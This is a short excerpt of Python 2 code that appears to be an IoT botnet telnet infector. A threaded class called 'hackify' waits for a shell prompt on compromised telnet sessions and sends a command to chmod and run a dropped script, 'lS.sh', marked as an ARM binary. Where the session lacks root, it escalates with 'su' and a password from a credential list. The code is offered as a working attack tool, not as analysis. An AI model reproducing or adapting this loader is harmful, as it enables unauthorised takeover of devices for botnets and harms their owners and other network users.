...
cmd = "cd;/lS.sh; chmod 777 lS.sh; sh lS.sh" #arm4 binary
count = 0
...
class hackify(threading.Thread):
		...
		try:
			...
			mp += tn.recv(1024)
			if "#" in mp or "$" in mp:
				if r00t: tn.send(cmd + "\n"); print "\033[1;37mROOTcommand sent %s!"%(self.ip); time.sleep(10); tn.close()
				if not r00t: tn.send("su" + "\n"); readUntil(tn, "Password:"); tn.send(passwords[0] + "\n"); time.sleep(1); tn.send(cmd + "\n"); print "\033[1;36mNONROOTcommand sent %s!"%(self.ip); time.sleep(10); tn.close()
		except Exception:
			tn.close()
